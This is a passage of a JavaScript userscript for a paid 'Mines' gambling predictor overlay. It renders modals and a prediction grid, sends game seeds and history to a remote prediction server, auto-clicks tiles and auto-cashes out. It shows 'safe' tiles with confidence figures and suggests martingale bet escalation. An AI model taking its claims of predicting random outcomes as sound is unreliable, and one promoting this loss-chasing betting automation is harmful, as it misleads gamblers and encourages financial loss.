 btn.textContent = 'Apply';
 btn.disabled = false;
 }
 });
 return;

 } else if (type === 'algo') {
 const tempSelected = [...selectedAlgos];
 modal.style.minWidth = '480px';
 modal.style.maxWidth = '520px';
 function renderAlgoGrid() {
 return ALGO_DEFS.map(a => {
 const on = tempSelected.includes(a.id);
 const border = on ? accentColor : CARD_BORDER;
 const bg = on ? accentColor + '22' : CARD_BG;
 const nameColor = on ? accentColor : TEXT_MAIN;
 return `<div class="_01studios_algo_card" data-id="${a.id}" style="background:${bg};border:1.5px solid ${border};border-radius:10px;padding:10px 12px;cursor:pointer;position:relative;">
 <div style="display:flex;justify-content:space-between;align-items:flex-start;">
 <span style="color:${nameColor};font-size:12px;font-weight:700;">${a.label}</span>
 <div style="width:16px;height:16px;border-radius:4px;border:1.5px solid ${on?accentColor:'#444'};background:${on?accentColor:'transparent'};display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-left:8px;">${on?'<span style="color:#000;font-size:10px;font-weight:900;">✓</span>':''}</div>
 </div>
 <div style="color:#555;font-size:9px;margin-top:4px;line-height:1.4;">${a.desc}</div>
 </div>`;
 }).join('');
 }
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
 <span style="color:${accentColor};font-size:13px;font-weight:700;letter-spacing:2px;">~ ALGORITHM SELECT</span>
 <button id="_01studios_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
 <span style="color:#555;font-size:10px;">AVAILABLE ALGORITHMS</span>
 <span id="_01studios_algo_count" style="color:${accentColor};font-size:10px;font-weight:700;">SELECTED: ${tempSelected.length}/4</span>
 </div>
 <div id="_01studios_algo_grid" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;max-height:400px;overflow-y:auto;">${renderAlgoGrid()}</div>
 <div style="color:#555;font-size:9px;margin-top:10px;border-top:1px solid #222;padding-top:8px;">Replaces the 4 algo slots. Blends selected algorithms by averaging scores.</div>
 <div style="display:flex;gap:8px;margin-top:12px;">
 <button id="_01studios_algo_reset" style="flex:1;padding:9px;background:#2a2a2a;border:1px solid #333;color:#888;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;">Reset</button>
 <button id="_01studios_algo_apply" style="flex:2;padding:9px;background:linear-gradient(135deg,${accentColor}22,${accentColor}44);border:1.5px solid ${accentColor};color:${accentColor};border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;">Apply</button>
 </div>`;
 overlay.appendChild(modal);
 document.body.appendChild(overlay);
 modal.querySelector('#_01studios_modal_close').addEventListener('click', closeModal);
 function refreshGrid() {
 modal.querySelector('#_01studios_algo_grid').innerHTML = renderAlgoGrid();
 modal.querySelector('#_01studios_algo_count').textContent = 'SELECTED: ' + tempSelected.length + '/4';
 attachCardClicks();
 }
 function attachCardClicks() {
 modal.querySelectorAll('._01studios_algo_card').forEach(card => {
 card.addEventListener('click', () => {
 const id = card.dataset.id;
 const idx = tempSelected.indexOf(id);
 if (idx >= 0) {
 tempSelected.splice(idx, 1);
 } else {
 if (tempSelected.length >= 4) return;
 tempSelected.push(id);
 }
 refreshGrid();
 });
 });
 }
 attachCardClicks();
 modal.querySelector('#_01studios_algo_reset').addEventListener('click', () => {
 tempSelected.length = 0;
 ['SemiRandom','Roundify','Random','HistoryEngine'].forEach(id => tempSelected.push(id));
 refreshGrid();
 });
 modal.querySelector('#_01studios_algo_apply').addEventListener('click', () => {
 selectedAlgos = [...tempSelected];
 localStorage.setItem('_01studios_algos', JSON.stringify(selectedAlgos));
 closeModal();
 triggerPrediction(lastUncovered, []);
 });
 return;

 } else if (type === 'analytics') {
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;">
 <span style="color:${accentColor};font-size:13px;font-weight:700;letter-spacing:2px;">- SESSION LOG</span>
 <button id="_01studios_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>
 <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:16px;">
 ${[{label:'WINS',val:sessionWins,color:'#00c97a'},{label:'LOSSES',val:sessionLosses,color:'#e05555'},{label:'W-RATE',val:sessionWins+sessionLosses>0?(sessionWins/(sessionWins+sessionLosses)*100).toFixed(0)+'%':'—',color:accentColor},{label:'PROFIT',val:(sessionProfit>=0?'+':'')+sessionProfit.toFixed(1),color:sessionProfit>=0?'#00c97a':'#e05555'}].map(s=>`<div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:10px;text-align:center;"><div style="color:#555;font-size:9px;margin-bottom:3px;">${s.label}</div><div style="color:${s.color};font-size:15px;font-weight:700;">${s.val}</div></div>`).join('')}
 </div>
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:10px;">
 <div id="_01studios_log_list" style="max-height:220px;overflow-y:auto;font-size:10px;color:${TEXT_DIM};">${analyticsLog.length===0?'<span style="color:#444;">No games played yet.</span>':analyticsLog.slice(-50).reverse().map(e=>{const c=e.result==='win'?'#00c97a':'#e05555';return`<div style="color:${c};padding:4px 0;border-bottom:1px solid #222;">[${e.time}] ${e.result.toUpperCase()} · ${e.mines} · ${e.mult?.toFixed(2)||'?'}x · ${e.uncovered} safe</div>`;}).join('')}</div>
 </div>`;
 } else if (type === 'heatmap') {
 const hm = buildHistoryHeatmap(mineCount, gridSize);
 const { freq, max, count: hmCount } = hm;
 const total = gridSize * gridSize;
 function heatColor(v, mx) {
 if (mx === 0) return '#1a1a1a';
 const t = v / mx;
 if (t === 0) return '#0d2b1a';
 const r = Math.round(14 + t * (224 - 14));
 const g = Math.round(43 + (1-t) * (201 - 43));
 const b = Math.round(26 + (1-t) * (122 - 26));
 return `rgb(${r},${g},${b})`;
 }
 const cells = Array.from({length: total}, (_, i) => {
 const pct = max > 0 ? ((freq[i] / max) * 100).toFixed(0) : 0;
 const bg = heatColor(freq[i], max);
 const textColor = freq[i] / (max || 1) > 0.5 ? '#fff' : '#aaa';
 return `<div title="Cell ${i+1}: ${freq[i]} mine hits" style="background:${bg};border-radius:6px;aspect-ratio:1;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:${textColor};cursor:default;">
 <div style="font-size:11px;">${freq[i]}</div>
 <div style="font-size:8px;opacity:0.7;">${pct}%</div>
 </div>`;
 }).join('');
 const histCount = getMineHistoryCount(mineCount);
 modal.style.minWidth = '400px';
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
 <span style="color:#ff7043;font-size:13px;font-weight:700;letter-spacing:2px;">+ MINE HEATMAP</span>
 <button id="_01studios_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
 <span style="color:#555;font-size:10px;">${mineCount} mines · 5×5 board</span>
 <span style="color:${accentColor};font-size:10px;font-weight:700;">${histCount} games recorded</span>
 </div>
 ${histCount < 10 ? `<div style="background:#1a1a00;border:1px solid #ff980033;border-radius:8px;padding:8px 12px;margin-bottom:12px;color:#ff9800;font-size:10px;">Warning: Only ${histCount}/10 games recorded. History Engine confidence is low — play more games to improve accuracy.</div>` : ''}
 <div style="display:grid;grid-template-columns:repeat(${gridSize},1fr);gap:4px;margin-bottom:14px;">${cells}</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
 <div style="display:flex;align-items:center;gap:6px;font-size:9px;color:#555;">
 <div style="width:12px;height:12px;background:#0d2b1a;border-radius:3px;"></div> Never mined
 <div style="width:12px;height:12px;background:rgb(119,122,74);border-radius:3px;"></div> Sometimes
 <div style="width:12px;height:12px;background:rgb(224,43,26);border-radius:3px;"></div> Hot zone
 </div>
 </div>
 <button id="_01studios_heatmap_clear" style="width:100%;padding:9px;background:#e0555518;border:1px solid #e0555544;color:#e05555;border-radius:8px;cursor:pointer;font-size:10px;font-weight:700;">X Clear History for ${mineCount} Mines</button>`;
 }

 overlay.appendChild(modal);
 document.body.appendChild(overlay);
 modal.querySelector('#_01studios_modal_close').addEventListener('click', closeModal);

 if (type === 'heatmap') {
 const clearBtn = modal.querySelector('#_01studios_heatmap_clear');
 if (clearBtn) clearBtn.addEventListener('click', () => {
 clearMineHistory(mineCount);
 closeModal();
 updateStatus(`X History cleared for ${mineCount} mines`, '#888');
 });
 }
 if (type === 'settings') {
 const toggleStates = {};
 function initToggle(id, initVal, onChange) {
 toggleStates[id] = initVal;
 const track = modal.querySelector('#' + id + '_track');
 const thumb = modal.querySelector('#' + id + '_thumb');
 if (!track) return;
 function update(val) {
 toggleStates[id] = val;
 track.style.background = val ? accentColor : '#333';
 thumb.style.left = val ? '20px' : '2px';
 // Update parent row style
 const row = track.closest('label') || track.closest('div[data-toggle]');
 if (row && row.style) {
 row.style.background = val ? accentColor + '22' : CARD_BG;
 row.style.borderColor = val ? accentColor : CARD_BORDER;
 }
 onChange(val);
 }
 track.addEventListener('click', function(e) { e.stopPropagation(); update(!toggleStates[id]); });
 // Also make the parent row clickable
 const row = track.closest('label');
 if (row) row.addEventListener('click', function(e) { if (e.target === track || e.target === thumb || track.contains(e.target)) return; e.preventDefault(); e.stopPropagation(); update(!toggleStates[id]); });
 }
 initToggle('_01studios_s_sound', !!settings.soundEffects, v => { settings.soundEffects = v; saveSettings(); });
 initToggle('_01studios_s_rigalert', !!settings.rigAlertSound, v => { settings.rigAlertSound = v; saveSettings(); });
 initToggle('_01studios_s_preemptive', !!settings.preemptiveUnrig, v => { settings.preemptiveUnrig = v; saveSettings(); });
 initToggle('_01studios_s_anim', settings.animations !== false, v => { settings.animations = v; saveSettings(); });
 initToggle('_01studios_s_autopredict', settings.autoPredict !== false, v => { settings.autoPredict = v; saveSettings(); });
 initToggle('_01studios_s_showrevealed',settings.showRevealed !== false, v => { settings.showRevealed = v; saveSettings(); });
 initToggle('_01studios_s_autosync', settings.autoSync !== false, v => { settings.autoSync = v; saveSettings(); });
 initToggle('_01studios_s_highlight', settings.highlightGrid !== false,v => { settings.highlightGrid = v; saveSettings(); });
 initToggle('_01studios_s_clickthrough',!!settings.clickThrough, v => { settings.clickThrough = v; saveSettings(); });
 initToggle('_01studios_s_anon', !!settings.anonMode, v => { settings.anonMode = v; saveSettings(); applyAnonMode(v); });
 initToggle('_01studios_s_nochat', !!settings.noChatMode, v => { settings.noChatMode = v; saveSettings(); applyNoChatMode(v); });

 let pendingAccent = accentColor;
 modal.querySelectorAll('._01studios_theme_swatch').forEach(sw => {
 sw.addEventListener('click', () => {
 pendingAccent = sw.dataset.color;
 modal.querySelectorAll('._01studios_theme_swatch').forEach(s => {
 const on = s.dataset.color === pendingAccent;
 s.style.border = on ? '2px solid #fff' : '2px solid transparent';
 s.style.boxShadow = on ? '0 0 0 1px ' + pendingAccent : 'none';
 });
 const cw = modal.querySelector('#_01studios_s_colorwheel');
 const ch = modal.querySelector('#_01studios_s_colorhex');
 if (cw) cw.value = pendingAccent;
 if (ch) { ch.textContent = pendingAccent; ch.style.color = pendingAccent; }
 });
 });
 const cw = modal.querySelector('#_01studios_s_colorwheel');
 const ch = modal.querySelector('#_01studios_s_colorhex');
 if (cw) cw.addEventListener('input', () => {
 pendingAccent = cw.value;
 if (ch) { ch.textContent = pendingAccent; ch.style.color = pendingAccent; }
 modal.querySelectorAll('._01studios_theme_swatch').forEach(s => {
 s.style.border = '2px solid transparent';
 s.style.boxShadow = 'none';
 });
 });

 const dl = modal.querySelector('#_01studios_s_delay');
 if (dl) dl.addEventListener('change', () => { settings.predDelay = dl.value; });

 const mm = modal.querySelector('#_01studios_mart_mult_modal');
 if (mm) mm.addEventListener('change', e => { martingaleMultiplier = parseFloat(e.target.value) || 2; });

 const rp = modal.querySelector('#_01studios_reset_pos_btn');
 if (rp) rp.addEventListener('click', () => {
 resetPos();
 const p = document.getElementById('_01studios_panel');
 if (p) { p.style.left = '20px'; p.style.top = '80px'; }
 closeModal();
 });
 const saveBtn = modal.querySelector('#_01studios_settings_save');
 if (saveBtn) saveBtn.addEventListener('click', () => {
 accentColor = pendingAccent;
 localStorage.setItem('_01studios_accent', accentColor);
 settings.customAccent = pendingAccent;
 settings.predColor = pendingAccent;
 saveSettings();

 closeModal();

 buildGUI();

 setTimeout(() => applyAccentColor(), 50);
 });
 }
 }

 function closeModal() { document.getElementById('_01studios_modal_overlay')?.remove(); }

 function buildGridCells() {
 const total = gridSize * gridSize;
 const cellSize = gridSize<=4?52:gridSize<=5?44:gridSize<=6?36:30;
 const fontSize = cellSize>44?15:12;
 let html = '';
 for (let i = 0; i < total; i++) {
 const p = prediction[i];
 let bg='#111',border='#1e1e1e',content='',glow='',extra='';
 if (p) {
 if (p.isRevealed&&p.isSafe){
 bg='#00c97a18';border='#00c97a55';
 content=`<span style="color:#00c97a;font-size:${fontSize}px;font-weight:700;">✓</span>`;
 glow='box-shadow:0 0 8px #00c97a33;';
 } else if(p.isRevealed&&p.isMine){
 bg='#e0555518';border='#e0555544';
 content=`<span style="font-size:${fontSize}px;"></span>`;
 glow='box-shadow:0 0 8px #e0555533;';
 } else if(p.isSuggestedSafe){
 const pc=getPredColor();
 const conf = p.confidence || 0;
 const confColor = conf >= 70 ? '#00c97a' : conf >= 45 ? accentColor : '#e07a30';
 const glowAlpha = Math.round(30 + conf * 0.5).toString(16).padStart(2,'0');
 bg=`linear-gradient(135deg,${pc}28,${pc}18)`;
 border=pc;
 glow=`box-shadow:0 0 ${8+Math.round(conf/10)}px ${pc}${glowAlpha},inset 0 1px 0 ${pc}33;`;
 content=`<div style="display:flex;flex-direction:column;align-items:center;gap:1px;">`
 +`<svg width="${fontSize}" height="${fontSize}" viewBox="0 0 24 24" fill="${pc}"><polygon points="12,2 15,9 22,9 16,14 18,21 12,17 6,21 8,14 2,9 9,9"/></svg>`
 +`<span style="color:${pc};font-size:8px;font-weight:700;opacity:0.9;">${p.pickOrder}</span>`
 +`<span style="color:${confColor};font-size:7px;font-weight:600;opacity:0.85;">${conf}%</span>`
 +`</div>`;
 extra='border-width:1.5px;';
 }
 }
 const isClickable = p && p.isSuggestedSafe && !p.isRevealed;
 const clickStyle = isClickable ? 'cursor:pointer;' : 'cursor:default;';
 html+=`<div data-cidx="${i}" style="background:${bg};border:1px solid ${border};border-radius:8px;aspect-ratio:1;display:flex;align-items:center;justify-content:center;transition:all 0.2s;${glow}${extra}${clickStyle}">${content}</div>`;
 }
 return html;
 }

 function updateStatus(text, color) {
 const debugPhrases = [
 'Waiting for game', 'No game detected', 'AUTO ON', 'waiting for next',
 'Auto click off', 'Auto cashout off', 'Auto start off', 'Ready — waiting',
 'Auto pressing', 'Clicking tile', 'Auto press done', 'will fire on next',
 'will start new game', 'will cashout after'
 ];
 const isDebug = debugPhrases.some(p => text.includes(p));
 const el=document.getElementById('_01studios_status_text');
 if(el){ el.textContent = isDebug ? '' : text; }
 const dot=document.getElementById('_01studios_game_status_dot');
 if(dot){
 const isActive = color==='#00c97a' || (text&&(text.includes('Game')||text.includes('game')||text.includes('Running')||text.includes('Won')||text.includes('Lost')));
 const noGame = isDebug || (text&&(text.includes('Waiting')||text.includes('No game')));
 if(noGame){dot.style.background='#e05555';dot.style.boxShadow='0 0 6px #e0555588';}
 else if(isActive){dot.style.background='#00c97a';dot.style.boxShadow='0 0 6px #00c97a88';}
 }
 const badge=document.getElementById('_01studios_live_badge');
 if(badge)badge.style.display=color==='#00c97a'?'block':'none';
 }
 function updateGrid() { const g=document.getElementById('_01studios_grid');if(g){g.style.gridTemplateColumns=`repeat(${gridSize},1fr)`;g.innerHTML=buildGridCells();} }
 function updateStats(multiplier) {
 const set=(id,val,color)=>{const el=document.getElementById(id);if(el){el.textContent=val;if(color)el.style.color=color;}};
 set('_01studios_wins',sessionWins,'#00c97a');set('_01studios_losses',sessionLosses,'#e05555');
 const s=winStreak>0?winStreak:-lossStreak;
 set('_01studios_streak',(s>0?'+':'')+s,s>0?'#00c97a':s<0?'#e05555':accentColor);
 if(multiplier)set('_01studios_mult',multiplier.toFixed(2)+'x',accentColor);
 set('_01studios_profit',(sessionProfit>=0?'+':'')+sessionProfit.toFixed(1),sessionProfit>=0?'#00c97a':'#e05555');
 set('_01studios_mine_count',mineCount);
 const badge=document.getElementById('_01studios_grid_badge');if(badge)badge.textContent=gridSize+'×'+gridSize+' · '+mineCount+' mines';
 updateSuggestedBet();updateStrategyBar(lastUncovered.length);
 }
 function updateStrategyBar(rc) {
 rc=rc||0;const optimal=findOptimalCashout(mineCount,gridSize*gridSize);const nextP=nextClickProb(mineCount,rc,gridSize*gridSize);
 const set=(id,val,color)=>{const el=document.getElementById(id);if(el){el.textContent=val;if(color)el.style.color=color;}};
 set('_01studios_next_prob',(nextP*100).toFixed(0)+'%',nextP>0.7?'#00c97a':nextP>0.4?accentColor:'#e05555');
 set('_01studios_optimal_tiles',targetTiles+' tiles',accentColor);set('_01studios_target_mult',optimal.mult.toFixed(2)+'x',accentColor);
 const bar=document.getElementById('_01studios_next_prob_bar');if(bar)bar.style.width=(nextP*100).toFixed(0)+'%';
 }
 function updateSuggestedBet() {
 let bet=baseBet;
 if(currentMode==='martingale')bet=Math.min(baseBet*Math.pow(martingaleMultiplier,lossStreak),baseBet*8);
 else if(currentMode==='aggressive')bet=baseBet*Math.pow(2,Math.min(winStreak,3));
 currentBet=Math.round(bet*10)/10;const el=document.getElementById('_01studios_suggested_bet');if(el)el.textContent=currentBet;
 }
 function updateModeButtons() {
 document.querySelectorAll('._01studios_mode_btn').forEach(btn=>{const active=btn.dataset.mode===currentMode;btn.style.background=active?accentColor+'22':CARD_BG;btn.style.borderColor=active?accentColor:CARD_BORDER;const icon=btn.querySelector('div:first-child');const label=btn.querySelector('div:nth-child(2)');if(icon)icon.style.color=active?accentColor:TEXT_DIM;if(label)label.style.color=active?accentColor:TEXT_MAIN;});
 }
 function updateTileButtons() { updateTileDisplay(); }
 function updateTileDisplay() {
 const maxSafe=Math.max(1,gridSize*gridSize-mineCount);
 const el=document.getElementById('_01studios_tile_count');if(el)el.textContent=targetTiles;
 const bar=document.getElementById('_01studios_tile_bar');if(bar)bar.style.width=Math.round(targetTiles/maxSafe*100)+'%';
 }
 function updateGridSizeButtons() {
 document.querySelectorAll('._01studios_grid_btn').forEach(btn=>{const active=parseInt(btn.dataset.size)===gridSize;btn.style.background=active?accentColor:'#2a2a2a';btn.style.borderColor=active?accentColor:'#333';btn.style.color=active?'#000':TEXT_DIM;});
 }

 function updateLiveBombHeatmap(uncoveredSafe, uncoveredMines) {
 if (!_bombScores) return;
 const bombProb = computeLiveBombProb(mineCount, gridSize, uncoveredSafe, uncoveredMines);
 const total = gridSize * gridSize;
 const grid = document.getElementById('_01studios_grid');
 if (!grid) return;
 const cells = grid.querySelectorAll('[data-cidx]');
 cells.forEach(cell => {
 const i = parseInt(cell.dataset.cidx);
 if (isNaN(i) || i >= total) return;
 const p = prediction[i];
 if (p && !p.isRevealed && !p.isSuggestedSafe && bombProb[i] > 0) {
 const intensity = Math.min(0.45, bombProb[i] * 1.2);
 const alpha = Math.round(intensity * 255).toString(16).padStart(2,'0');
 cell.style.background = `rgba(224,85,85,${intensity.toFixed(2)})`;
 cell.style.borderColor = `#e05555${alpha}`;
 if (bombProb[i] > 0.4 && !cell.querySelector('._01studios_bomb_prob')) {
 const label = document.createElement('span');
 label.className = '_01studios_bomb_prob';
 label.style.cssText = 'color:#e05555;font-size:7px;font-weight:700;position:absolute;bottom:2px;right:3px;';
 label.textContent = Math.round(bombProb[i]*100)+'%';
 cell.style.position = 'relative';
 cell.appendChild(label);
 }
 }
 });
 }

 function updateNonceLookaheadUI() {
 const el = document.getElementById('_01studios_nonce_lookahead');
 if (!el) return;
 if (!_nonceLookahead || _nonceLookahead.length === 0) {
 el.style.display = 'none';
 return;
 }
 el.style.display = 'none'; return;
 const best = _nonceLookahead.reduce((a, b) => b.hotness > a.hotness ? b : a);
 el.innerHTML = _nonceLookahead.map(g => {
 const isBest = g.offset === best.offset;
 const color = g.hotness >= 70 ? '#00c97a' : g.hotness >= 45 ? accentColor : '#555';
 const bg = isBest ? color + '22' : '#1a1a1a';
 const border = isBest ? color : '#2a2a2a';
 return `<div style="background:${bg};border:1px solid ${border};border-radius:6px;padding:4px 6px;text-align:center;flex:1;">
 <div style="color:#555;font-size:8px;font-weight:600;">+${g.offset}</div>
 <div style="color:${color};font-size:10px;font-weight:700;">${g.hotness}%</div>
 ${isBest ? '<div style="color:'+color+';font-size:7px;">HOT</div>' : ''}
 </div>`;
 }).join('');
 }

 function updateRegimeUI() {
 const el = document.getElementById('_01studios_regime_badge');
 if (!el) return;
 const { regime, shift } = _currentRegime;
 const map = {
 shifting: { label: 'SHIFTING', color: '#e07a30', desc: 'Bombs moving — DriftMap active' },
 stable: { label: 'STABLE', color: '#00c97a', desc: 'Bombs steady — History Engine boosted' },
 neutral: { label: 'NEUTRAL', color: '#555', desc: 'Mixed pattern' }
 };
 const r = map[regime] || map.neutral;
 el.style.color = r.color;
 el.style.borderColor = r.color + '44';
 el.textContent = r.label;
 el.title = r.desc + (shift ? ` (shift: ${shift})` : '');
 }
 function updateAnalyticsLog() {
 const el=document.getElementById('_01studios_log_list');if(!el)return;
 if(analyticsLog.length===0){el.innerHTML='<span style="color:#444;">No games played yet.</span>';return;}
 el.innerHTML=analyticsLog.slice(-50).reverse().map(e=>{const c=e.result==='win'?'#00c97a':'#e05555';return`<div style="color:${c};padding:4px 0;border-bottom:1px solid #222;">[${e.time}] ${e.result.toUpperCase()} · ${e.mines} · ${e.mult?.toFixed(2)||'?'}x · ${e.uncovered} safe</div>`;}).join('');
 }
 function triggerPrediction(uncoveredSafe, uncoveredMines, delayOverlay) {
 const delayMap = { instant:0, fast:300, normal:800, slow:1500 };
 const predDelay = delayMap[settings.predDelay || 'instant'] ?? 0;
 async function doPredict() {
 mineCount=readMineCount();
 var game = currentGameData || {};
 var r = await _01_call('/predict/mines', {
 game: { uuid: game.uuid, clientSeed: game.clientSeed, nonce: game.nonce, serverHash: game.serverHash },
 mines: mineCount, gridSize: gridSize, targetTiles: targetTiles,
 uncoveredSafe: uncoveredSafe || [], uncoveredMines: uncoveredMines || [],
 selectedAlgos: selectedAlgos,
 analyticsLog: analyticsLog.slice(-20),
 mineHistory: getMineHistory(mineCount, 50),
 sessionStats: { winStreak: winStreak, lossStreak: lossStreak, betAmount: game.betAmount || 0 }
 });
 if (r && !r.error) {
 var safePicks = r.safePicks || [];
 _bombScores = r.bombData || null;
 _currentRegime = r.regime || { regime: 'neutral', shift: 0, centroid: null };
 _nonceLookahead = r.lookahead || null;
 var total = gridSize * gridSize;
 var revealed = new Set((uncoveredSafe||[]).concat(uncoveredMines||[]));
 var safeMap = new Map();
 safePicks.forEach(function(p) { safeMap.set(p.index, p); });
 prediction = Array.from({length: total}, function(_, i) {
 if (revealed.has(i)) return { index: i, isRevealed: true, isSafe: (uncoveredSafe||[]).indexOf(i)>=0, isMine: (uncoveredMines||[]).indexOf(i)>=0, isSuggestedSafe: false, pickOrder: -1, confidence: 0 };
 if (safeMap.has(i)) { var pk = safeMap.get(i); return { index: i, isRevealed: false, isSafe: false, isMine: false, isSuggestedSafe: true, pickOrder: pk.pickOrder, confidence: pk.confidence }; }
 return { index: i, isRevealed: false, isSafe: false, isMine: false, isSuggestedSafe: false, pickOrder: -1, confidence: 0 };
 });
 // Handle session token from server
                if (r._session) { _01_sessionToken = r._session.token; _01_sessionExpires = r._session.expires; }
                // Key expiry warning
                if (r._daysLeft !== undefined && r._daysLeft <= 3 && r._daysLeft >= 0) {
                    var _expiryEl = document.getElementById('_01studios_expiry_warn');
                    if (!_expiryEl) {
                        _expiryEl = document.createElement('div');
                        _expiryEl.id = '_01studios_expiry_warn';
                        _expiryEl.style.cssText = 'position:fixed;top:60px;left:50%;transform:translateX(-50%);background:#1a1a00;border:1.5px solid #ff9800;border-radius:10px;padding:10px 18px;z-index:2147483648;font-family:Segoe UI,sans-serif;cursor:pointer;';
                        _expiryEl.innerHTML = '<div style="color:#ff9800;font-size:11px;font-weight:700;">Key expires in ' + r._daysLeft + ' day' + (r._daysLeft !== 1 ? 's' : '') + ' — renew soon</div>';
                        _expiryEl.addEventListener('click', function() { this.remove(); });
                        document.body.appendChild(_expiryEl);
                        setTimeout(function() { var e = document.getElementById('_01studios_expiry_warn'); if(e) e.remove(); }, 15000);
                    }
                }
                if (r.rigSignals && r.rigSignals.length && game.uuid !== _rigNotifUUID) { _rigNotifUUID = game.uuid; showRigNotification(r.rigSignals.map(function(s){return s.reason;}).join(' '), true); }
 }

 updateGrid();
 updateStrategyBar(uncoveredSafe?uncoveredSafe.length:0);
 updateStats();
 updateTileButtons();
 clearBoardOverlay();
 injectOverlayStyles();
 updateBoardOverlay(0);

 updateLiveBombHeatmap(uncoveredSafe||[], uncoveredMines||[]);

 updateNonceLookaheadUI();

 updateRegimeUI();
 }
 async function afterPredict() {
 await doPredict();
 if (autoPressEnabled) {
 if (!autoPressActive) {
 _minesSequenceLock = false;
 _minesSequenceComplete = false;
 }
 setTimeout(() => runAutoPress(), 200);
 }
 }
 if (predDelay > 0) setTimeout(afterPredict, predDelay);
 else afterPredict();
 }
 function checkCashoutAlert(revealedCount) {
 const total = gridSize * gridSize;
 const optimal = findOptimalCashout(mineCount, total);
 const currentEV = survivalProb(mineCount, revealedCount, total) * calcMultiplier(mineCount, revealedCount, total);
 const nextEV = survivalProb(mineCount, revealedCount + 1, total) * calcMultiplier(mineCount, revealedCount + 1, total);
 const pastOptimal = revealedCount >= optimal.tiles;
 const evDropping = nextEV < currentEV * 0.97;

 if (settings.alertCashout && (pastOptimal || evDropping)) {
 const currentMult = calcMultiplier(mineCount, revealedCount, total);
 updateStatus(`* CASH OUT NOW! ${currentMult.toFixed(2)}x — EV peak reached!`, accentColor);
 const panel = document.getElementById('_01studios_panel');
 if (panel) {
 panel.style.boxShadow = `0 8px 40px rgba(0,0,0,0.8),0 0 0 2px ${accentColor}`;
 setTimeout(() => { panel.style.boxShadow = '0 8px 40px rgba(0,0,0,0.8),0 0 0 1px rgba(245,197,24,0.08)'; }, 3000);
 }
 }

 if (autoCashoutEnabled && gameRunning && revealedCount > 0) {
 if (revealedCount < targetTiles) return;

 const evThreshold = settings.evCashoutThreshold || 0.97;
 if (nextEV < currentEV * evThreshold || pastOptimal) {
 if (autoPressEnabled) {
 if (!_minesSequenceComplete) return;
 } else {
 if (autoPressActive || _minesSequenceLock) return;
 }

 const currentMult = calcMultiplier(mineCount, revealedCount, total);
 updateStatus(` EV cashout — ${currentMult.toFixed(2)}x (next click EV drops ${((1-nextEV/currentEV)*100).toFixed(0)}%)`, '#00c97a');
 setTimeout(() => {
 if (!autoPressActive && !_minesSequenceLock) performAutoCashout();
 }, 400);
 }
 }
 }

 function attachEvents(panel) {
 panel.addEventListener('mousedown', e => { e.stopPropagation(); });
 panel.addEventListener('click', e => { e.stopPropagation(); });

 const header=panel.querySelector('#_01studios_header');
 header.addEventListener('mousedown',e=>{if(!e.isTrusted)return;if(e.target.tagName==='BUTTON'||e.target.tagName==='INPUT')return;isDragging=true;const r=panel.getBoundingClientRect();dragOffsetX=e.clientX-r.left;dragOffsetY=e.clientY-r.top;panel.style.transition='none';e.preventDefault();});
 document.addEventListener('mousemove',e=>{if(!isDragging||!e.isTrusted)return;e.preventDefault();const x=Math.max(0,Math.min(window.innerWidth-panel.offsetWidth,e.clientX-dragOffsetX));const y=Math.max(0,Math.min(window.innerHeight-panel.offsetHeight,e.clientY-dragOffsetY));panel.style.left=x+'px';panel.style.top=y+'px';});
 document.addEventListener('mouseup',e=>{if(!e.isTrusted)return;if(isDragging){isDragging=false;panel.style.transition='';savePos(parseInt(panel.style.left),parseInt(panel.style.top));}});
 panel.querySelector('#_01studios_minimize').addEventListener('click',()=>{panelMinimized=!panelMinimized;const body=panel.querySelector('#_01studios_body');if(body)body.style.display=panelMinimized?'none':'';panel.querySelector('#_01studios_minimize').textContent=panelMinimized?'+':'−';});

 const menuBtn = panel.querySelector('#_01studios_menu_btn');
 if (menuBtn) {
 menuBtn.addEventListener('click', (e) => {
 e.stopPropagation();
 openRadial();
 });
 }

 panel.querySelectorAll('._01studios_mode_btn').forEach(btn=>btn.addEventListener('click',()=>{currentMode=btn.dataset.mode;updateModeButtons();}));
 panel.querySelector('#_01studios_tile_dec')?.addEventListener('click',()=>{
 const maxSafe=Math.max(1,gridSize*gridSize-mineCount);
 if(targetTiles>1){targetTiles--;updateTileDisplay();}
 });
 panel.querySelector('#_01studios_tile_inc')?.addEventListener('click',()=>{
 const maxSafe=Math.max(1,gridSize*gridSize-mineCount);
 if(targetTiles<Math.min(20,maxSafe)){targetTiles++;updateTileDisplay();}
 });
 panel.querySelector('#_01studios_mine_dec').addEventListener('click',()=>{if(mineCount>1){mineCount--;updateStats();}});
 panel.querySelector('#_01studios_mine_inc').addEventListener('click',()=>{if(mineCount<gridSize*gridSize-1){mineCount++;updateStats();}});
 panel.querySelector('#_01studios_autopress').addEventListener('click',()=>autoPressTiles());
 panel.querySelector('#_01studios_autocashout').addEventListener('click',()=>toggleAutoCashout());
 panel.querySelector('#_01studios_autostart').addEventListener('click',()=>toggleAutoStart());

 const gridEl = panel.querySelector('#_01studios_grid');
 if (gridEl) {
 gridEl.addEventListener('click', e => {
 const cell = e.target.closest('[data-cidx]');
 if (!cell) return;
 const idx = parseInt(cell.dataset.cidx, 10);
 const p = prediction[idx];
